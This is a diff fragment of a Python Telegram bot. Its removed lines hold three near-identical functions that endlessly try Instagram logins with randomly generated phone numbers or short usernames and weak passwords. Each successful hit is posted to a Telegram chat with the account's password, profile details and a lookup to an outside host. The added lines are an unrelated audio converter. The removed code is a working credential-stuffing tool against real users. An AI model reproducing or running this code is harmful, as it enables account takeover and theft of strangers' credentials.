-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4)
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy *",parse_mode = "markdown",reply_markup=o) 
-##
-#
-#
-#
-#
-#
-
-
-#
-
-
-
-def Kuwait(message):
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987654321')
-		us = str(''.join((random.choice(user) for i in range(5))))
-		username = '+965655' + us
-		password = '655' + us
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI CARINO ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4)
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy *",parse_mode = "markdown",reply_markup=o)
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-def SAUDIA(message):
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987654321') 
-		us = str(''.join((random.choice(user) for i in range(7))))
-		username = '+96655' + us
-		password = '055' + us
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI CARINO ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4)
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy *",parse_mode = "markdown",reply_markup=o) 
-#
-#
-
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-#
-def Morocco(message):	
-	S = 0
-	B = 0
-	H = 0
-	while True:
-		url = 'https://www.instagram.com/api/v1/accounts/login/'
-		headers = {
-'accept': '*/*',
-'access-control-allow-credentials': 'true',
-'access-control-allow-origin': 'https://www.instagram.com',
-'access-control-expose-headers': 'X-IG-Set-WWW-Claim',
-'accept-encoding': 'gzip, deflate, br',
-'accept-language': 'en-US,en;q=0.9',
-'content-length': '352',
-'content-type': 'application/x-www-form-urlencoded',
-'cookie':'csrftoken=NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl; mid=YaI20gABAAE-305WmqAPpfh0-J8R; ig_did=77A2E708-6AD8-4B7F-B825-8C85DB5253DD; ig_nrcb=1',
-'origin': 'https://www.instagram.com',
-'referer': 'https://www.instagram.com/accounts/login/',
-'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="96"',
-'sec-ch-ua-mobile': '?0',
-'sec-ch-ua-platform': '"Linux"',
-'sec-fetch-dest': 'empty',
-'sec-fetch-mode': 'cors',
-'sec-fetch-site': 'same-origin',
-'User-Agent':'Instagram 99.1.1.9.99 Android (25/7.1.2; 476dpi; 1440x2417; Huawei/google; Nexus 6P; angler; angler; en_US)',  
-'x-asbd-id':'198387',
-'x-csrftoken':'NWzmdzWCbOEa0eJJaCtPVNG6b3mYS6yl',
-'x-ig-app-id':'936619743392459',
-'x-requested-with':'XMLHttpRequest',
-'Host':'i.instagram.com'}
-		user = ('0987._654321QWERTYUIOPASDFGHJKLZXCVBNM')
-		us = str(''.join((random.choice(user) for i in range(4))))
-		username = '' + us
-		password = '12341234@'
-		uid = str(uuid4())
-		data = {'uuid':uid,  'password':password, 
-     'username':username, 
-     'device_id':uid, 
-     'from_reg':'false', 
-     '_csrftoken':'missing', 
-     'login_attempt_countn':'0'}
-		req_login = requests.post(url, headers=headers, data=data, allow_redirects=True)
-		if 'logged_in_user' in req_login.json():
-			user_CaRiNo = req_login.json()['logged_in_user']['username']
-			head = {'HOST':'www.instagram.com',  
-     'KeepCaRiNove':'True', 
-     'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36',      'Cookie':'csrftoken=pEWal626VHRrTkELezrrF44fT8RWjw7U; Domain=.instagram.com; expires=Tue, 25-Oct-2022 14:55:49 GMT; Max-Age=31449600; Path=/; Secure',
-     'Accept':'*/*', 
-     'ContentType':'application/x-www-form-urlencoded', 
-     'X-Requested-With':'XMLHttpRequest', 
-     'X-IG-App-ID':'936619743392459', 
-     'X-Instagram-AJAX':'ae566ed55fb7', 
-     'X-CSRFToken':'pEWal626VHRrTkELezrrF44fT8RWjw7U', 
-     'Accept-Language':'en-US,en;q=0.9'}
-			url_o9=(f"https://www.instagram.com/{user_CaRiNo}/?__a=1")
-			req=requests.get(url_o9, headers=head).json() 
-			CaRiNo=req['graphql']['user']['id']
-			name=req['graphql']['user']['full_name']
-			following =req['graphql']['user']['edge_follow']['count']
-			followes = req['graphql']['user']['edge_followed_by']['count']
-			alsh = requests.get(f"https://o7aa.pythonanywhere.com/?id={CaRiNo}") 
-			alsh1 = alsh.json()            
-			data = alsh1['data']		            	
-			H+=1
-			Hit = (f"""			
-⌯ HI CARINO ACCOUNT INSTAGRAM⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙽𝙰𝙼𝙴 : [ {name} ] ⌯
-⌯ 𝚄𝚂𝙴𝚁 : [ {user_CaRiNo} ] ⌯
-⌯ 𝙵𝙾𝙻𝙻𝙾𝚆𝙴𝚂 : [ {followes} ] ⌯ 
-⌯ 𝙵𝙾𝙻𝙻𝙾𝙸𝙽𝙶 : [ {following} ] ⌯
-⌯ 𝙳𝙰𝚃𝙴 : [ {data} ] ⌯
-⌯ ʟɪɴᴋ ɪɴsᴛᴀɢʀᴀᴍ : [ https://instagram.com/{user_CaRiNo} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ ᴇᴍᴀɪʟ : [ {username} ] ⌯
-⌯ ᴘᴀѕѕ : [ {password} ] ⌯
-⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯ ⌯
-⌯ 𝙲𝙷 : [ @oyurl ] ⌯    
-⌯ Dev : [ @IIlAndylII ] ⌯   
-""")
-			bot.send_message(message.chat.id, text=Hit)
-		elif '"message":"challenge_required","challenge"' in req_login.text:
-			S+=1
-		else:
-			B+=1
-		o = types.InlineKeyboardMarkup(row_width=1)
-		A1 = types.InlineKeyboardButton(f"❌ Bad No : {B} ",callback_data='CaRiNo')
-		A2 = types.InlineKeyboardButton(f"✅ Hacker Hit : {H}",callback_data='CaRiNo1')
-		A3 = types.InlineKeyboardButton(f"🔐 Secor : {S}",callback_data='CaRiNo2')
-		A4 = types.InlineKeyboardButton(f"🔎 User : {username} Pass : {password}",callback_data='CaRiNo3')
-		o.add(A1,A2,A3,A4)
-		bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="*Hi New Hack Instagram Andy*",parse_mode = "markdown",reply_markup=o) 
-def sss1(message):
-    bot.edit_message_text(chat_id=message.chat.id,message_id=message.message_id,text="<strong>✅ حسناً ارسل حساب انستا ليتم فحصه بـ نمط\nuser:paas</strong>",parse_mode="html")		
-bot.polling(True)
+        response = requests.post('https://api.onlinevideoconverter.pro/api/convert', headers=headers, json=json_data).json()['resource']['taskName']
+        bot.delete_message(chat_id=message.chat.id,message_id=p.message_id)
+        bot.send_voice(message.chat.id,f"https://en.onlinevideoconverter.pro/api/storage/{response}",caption=f"- العنوان : {title}\n- المشاهدات : {vi}",title="FuckOff",reply_markup=key2)
+    else:
+        bot.reply_to(message,f"صار خطأ ..")
+bot.infinity_polling()
